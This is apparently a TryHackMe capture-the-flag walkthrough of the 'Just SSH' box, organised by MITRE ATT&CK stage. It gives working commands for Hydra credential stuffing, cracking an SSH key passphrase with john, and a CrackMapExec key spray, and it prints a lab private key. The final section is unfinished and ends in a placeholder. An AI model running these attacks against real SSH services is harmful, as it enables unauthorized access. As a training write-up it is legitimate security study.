# Just SSH Walkthrough



## Overview
### Platform: Tryhackme
### Box Name: Just SSH
### Description: 

---
## Recon and Enumeration (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1595](https://attack.mitre.org/techniques/T1595/)                       | Active Scanning               | NMAP                        |
| [T1592](https://attack.mitre.org/techniques/T1592/)                       | Gather Victim Host Information | ssh -v                      |
| [T1591](https://attack.mitre.org/techniques/T1591/)                       | Gather Vicitm Org Information | ssh -v |
| [T1589](https://attack.mitre.org/techniques/T1589/)                       | Gather Victim Identify Information | Breached Creds, Personnel Roster |

### Enumeration
Run NMAP to discover what ports are open on the target:
```bash
sudo nmap $ip -Pn -n -oA discScan
```
<PRE>         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 00:41 EST
Nmap scan report for 10.10.43.128
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
</PRE>
Use SSH's debug mode to identify the pertinent information to the server:  
- protocol
- Version of SSH  
- Banner Information (if present)  
- Authentication Methods  
- Acceptable Keys for Authentication


```bash
ssh -v $ip
```
<PRE>
debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
debug1: SSH2_MSG_SERVICE_ACCEPT received

**************************************************************************
*                           Nexora Solutions                             *
*                    Secure Shell (SSH) Access Portal                    *
**************************************************************************

NOTICE: This system is for authorized use only. Unauthorized access or use 
is prohibited and may result in disciplinary action and/or civil and 
criminal penalties. All activities on this system are monitored and 
recorded. 

For assistance, contact:
  support@nexora-solutions.com
  j_davis@nexora-solutions.com

debug1: Authentications that can continue: publickey,password
debug1: Will attempt key: /home/not-root/.ssh/id_rsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_xmss 

</PRE>
What do we know:  
- SSH Authentication Methods: Publickey and Password  
- Possible Naming Convention: j_davis = f_last

What do we have:  
- Personnel Roster: Task 1  
- Breached Credentials: Task 2  

What can we do:  
- Credential Stuffing

---
---
## Initial Access (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1078](https://attack.mitre.org/techniques/T1078/)    | Valid Accounts    |  Hydra, SSH  |
| [T1110](https://attack.mitre.org/techniques/T1110/004/)   |  Credential Stuffing   |  Hydra   |


### Crafting the Credential Stuffing Attack
Make a users.txt list which reflects the naming convention found on the SSH Banner:  
f_lastName  

  
```bash
j_davis
b_harris
l_jackson
c_thomas
e_Anderson
d_white
a_garcia
j_smith
j_moore
m_brown
m_martin
s_miller
p_martinez
d_wilson
e_johnson
r_taylor
j_thompson
```

With our users.txt and the breached credentials list, we can initiate the Credential Stuffing attack.  
```bash
hydra -L users.txt -P breachedCreds.txt $ip ssh
```

<PRE>
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 119 login tries (l:17/p:7), ~8 tries per task
[DATA] attacking ssh://10.10.43.128:22/
[22][ssh] host: 10.10.43.128   login: j_moore   password: **********
[22][ssh] host: 10.10.43.128   login: m_brown   password: **********
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:07
</PRE>
Use the newly found credentials to gain your initial foothold, and get the userFlag.txt.
```bash
ssh j_moore@$ip
```
```bash
ssh m_brown@$ip
```

---
---
## Lateral Movement (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1021](https://attack.mitre.org/techniques/T1021/004/)    | Remote Services    | SSH    |
| [T1552](https://attack.mitre.org/techniques/T1552/)    | Unsecured Credentials    | Manual Enumeration / LinPEAS.sh    |
| [T1110](https://attack.mitre.org/techniques/T1110/002/)   | Password Cracking   | ssh2john, john/hashcat  |
| [T1110](https://attack.mitre.org/techniques/T1110/003/)    | Password Spraying    | NMAP Scripting Engine    |



### Internal Recon and Enumeration with LinPEAS
Transfer Linpeas to the target computer and run the script using j_moore's profile.
```bash
bash linpeas.sh 
```
Key Information from LinPEAS
- j_moore is part of the sftp_service group
- There are private keys stored on the sftp server and j_moore can access the following keys:
<PRE>
══╣ Possible private SSH keys were found!
/home/j_moore/.ssh/id_rsa
/home/sftp/uploads/.temp_keys/id_rsa_backup_script
/home/sftp/uploads/.temp_keys/id_rsa_contractor1
/home/sftp/uploads/.temp_keys/id_rsa_audit
</PRE>
- Barbara's private key can only be accessed directory from the SFTP service.
<PRE>
-rw------- 1 sftp sftp_service 3435 Jan  3 01:56 /home/sftp/uploads/.temp_keys/id_rsa_barbara
</PRE>
What do we know:
- Nexora-Solutions uses publickeys to access services and accounts
- SSH Key Sprawl is evident and likely.
- j_moore is part of the sftp_service group


What do we have:
- Private Keys for:
  - j_moore
  - m_brown
  - backup_script
  - contractor1
  - audit

What can we do:  
- Test j_moore's private key against sftp service
- Conduct a SSH Key Spray
  
### j_moore, lateral Move to SFTP
Log into the sftp service using j_moore's id_rsa:
```bash
sftp -i id_rsa sftp@$ip
```
<PRE>
The authenticity of host '10.10.64.168 (10.10.64.168)' can't be established.
ED25519 key fingerprint is SHA256:RPye4zEVR50BH+C2h4qT0zFRbYVknKzA3S/aP0fddoc.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.64.168' (ED25519) to the list of known hosts.

**************************************************************************
*                           Nexora Solutions                             *
*                    Secure Shell (SSH) Access Portal                    *
**************************************************************************

NOTICE: This system is for authorized use only. Unauthorized access or use 
is prohibited and may result in disciplinary action and/or civil and 
criminal penalties. All activities on this system are monitored and 
recorded. 

For assistance, contact:
  support@nexora-solutions.com
  j_davis@nexora-solutions.com

Enter passphrase for key 'id_rsa': 
</PRE>
Before we can log into the sftp service, we will need to crack the passphrase
associated to the id_rsa key.  

#### cracking ssh passphrases
Step 1: Transfer j_moore's id_rsa to the attack computer.  
Step 2: Utilize ssh2john to output a hash format for John/Hashcat to crack against.
```bash
ssh2john id_rsa_moore > moore.hash
```
Step 3: Use John or Hashcat to crack the hash (assuming it is a weak password). 
```bash
john moore.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
<PRE>
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
********         (id_rsa_moore)     
1g 0:00:00:08 DONE (2025-01-06 01:08) 0.1194g/s 40.14p/s 40.14c/s 40.14C/s nicholas..olivia
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
</PRE>
With the id_rsa passphrase, we can now test j_moore's id_rsa agains the sftp service.
```bash
sftp -i id_rsa sftp@$ip
```
<PRE>
Enter passphrase for key 'id_rsa': 
Connected to 10.10.64.168.
sftp> 
</PRE>

### sftp, Lateral Move to net-admin
#### Enumerating SFTP Documents
Get copies of all the documents and sift through the information.

```bash
cd uploads
get -r *
get .temp_keys
```
<details> 
<summary>Output for 'get -r *' Command</summary>
<pre>
Fetching /uploads/conf.bak/ to conf.bak
Retrieving /uploads/conf.bak
sw1.config                                                                                                                            100% 1323     1.1MB/s   00:00    
sw2.config                                                                                                                            100% 1466     1.3MB/s   00:00    
r1.conf                                                                                                                               100% 1184     1.2MB/s   00:00    
Fetching /uploads/internship.bak/ to internship.bak
Retrieving /uploads/internship.bak
welcome.txt                                                                                                                           100% 2796     3.1MB/s   00:00    
internshipChecklist.txt                                                                                                               100% 2034     1.0MB/s   00:00    
Fetching /uploads/scripts/ to scripts
Retrieving /uploads/scripts
sw1BackUpConfig.py                                                                                                                    100%  939   137.6KB/s   00:00    
r1BackUpConfig.py                                                                                                                     100% 1617     1.4MB/s   00:00    
sw2Status.py                                                                                                                          100%  939   154.8KB/s   00:00    
Fetching /uploads/supportTickets.bak/ to supportTickets.bak
Retrieving /uploads/supportTickets.bak
[!]Ticket#NX-001                                                                                                                      100%  261   705.0KB/s   00:00    
Ticket#NX-007                                                                                                                         100%  135    65.8KB/s   00:00    
Ticket#NX-002                                                                                                                         100%  180   164.7KB/s   00:00    
Ticket#NX-004                                                                                                                         100%  113   124.6KB/s   00:00    
Ticket#NX-006                                                                                                                         100%  145   127.6KB/s   00:00    
Ticket#NX-003                                                                                                                         100%  124    74.1KB/s   00:00    
Ticket#NX-005                                                                                                                         100%  136    39.3KB/s   00:00    
Ticket#NX-001                                                                                                                         100%  290   270.2KB/s   00:00 
</pre>
</details>

#### Identifying the Next Attack

**What do we know**:  
- There was a request to audit the SSH Keys; however, the task was never completed.
- Barbara Harris had access to critical systems.
<details>
<summary>Key Audit Information /home/sftp/uploads/.temp_keys/README.md</summary>
<PRE>

# Key Management Audit - Nexora Solutions

## Overview
This directory contains keys related to various users, contractors, and automation scripts. A key audit was initiated following the last security assessment but remains incomplete due to Barbara Harris's termination. The following keys require immediate review:

- **id_rsa_barbara**: Barbara's personal key for accessing critical systems.
- **id_rsa_contractor1**: A contractor's temporary access key. Usage expired months ago.
- **id_rsa_audit**: Key created during an external audit. No longer needed.
- **id_rsa_backup_script**: Used for automated configuration backups of routers and switches.

## Action Required
1. Delete unused keys.
2. Ensure only authorized keys remain in use.
3. Document all actions taken for compliance.

### Status
**Pending** - Assigned to Barbara Harris (Task incomplete due to termination).

### Notes
Failure to address key sprawl risks may lead to unauthorized access and breaches.
</PRE>
</details>

- Barbara Harris does not have a profile on the server.
<details>
<summary>List Of Users With a Profile</summary>
<PRE>
drwxr-xr-x 12 root      root      4096 Jan  3 02:23 .
drwxr-xr-x 20 root      root      4096 Dec 28 04:30 ..
drwxr-x---  3 d_wilson  d_wilson  4096 Jan  2 21:08 d_wilson
drwxr-x---  3 e_johnson e_johnson 4096 Jan  2 21:08 e_johnson
drwxr-x---  3 j_davis   j_davis   4096 Jan  2 21:08 j_davis
drwxr-x---  6 j_moore   j_moore   4096 Jan  2 21:36 j_moore
drwxr-x---  3 j_smith   j_smith   4096 Jan  2 21:08 j_smith
drwxr-x---  5 m_brown   m_brown   4096 Jan  2 21:08 m_brown
drwxr-x---  4 net-admin net-admin 4096 Jan  2 21:08 net-admin
drwxr-x---  3 s_miller  s_miller  4096 Jan  2 21:08 s_miller
drwxr-xr-x  4 root      root      4096 Jan  2 21:08 sftp
drwxr-x---  4 sys-admin sys-admin 4096 Jan  2 21:08 sys-admin
</PRE>
</details>

**What do we have**:  
- Barbara's private key.
<details>
<summary>id_rsa</summary>
<PRE>
-----BEGIN OPENSSH PRIVATE KEY-----
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
PhFf/BQmCm2vGv6AtRgitU0S4=
-----END OPENSSH PRIVATE KEY-----

</PRE>
</details>

**What can we do**:  
- Conduct a SSH Key Spray Attack

##### Crafting the Key Spray Attack

- Step 1:
  Create a user list to spray against:
  ```bash
  ls /home > users.txt
  ```
<details>
<summary>List of Users</summary>
<PRE>
d_wilson
e_johnson
j_davis
j_moore
j_smith
m_brown
net-admin
s_miller
sftp
sys-admin
</PRE>
</details>

- Step 2:
  Ensure Barbara's id_rsa has the correct privileges:
  ```bash
  chmod 600 id_rsa_barbara
  ```
###### Execute the SSH Key Spray

Use CrackMapExec (CME) to conduct the Key Spray:
```bash
crackmapexec ssh $ip -u users.txt --key-file id_rsa_barbara -p ''
```
<details>
<summary>CME Syntax</summary>
<PRE>
ssh = the service CME is working againts
-u = /location/to/username/list.txt
--key-file = /location/to/id_rsa
-p = passphrase for the id_rsa (if applicable)
</PRE>
</details>

## Privilege Escalation (MITRE ATT&CK Outline)

| Techniqe ID                 | Name                          | Tool(s) Used                |
|-----------------------------|-------------------------------|-----------------------------|
| [T1548](https://attack.mitre.org/techniques/T1548/003/)    | Abuse Elevation Control Mechanism    | Sudo Privileges
| [T1556](https://attack.mitre.org/techniques/T1556/)    | Modify Authentication Process    | /etc/ssh/sshd_config
| [T1110](https://attack.mitre.org/techniques/T1110/004/)    | Credential Stuffing    | hydra    |


### sftp to net-admin
With valid credentials we can enumerate the sftp service and sift through the documents for pertinent 
information. There are two particular documents that indicate a likely attack vector. blah blah blah

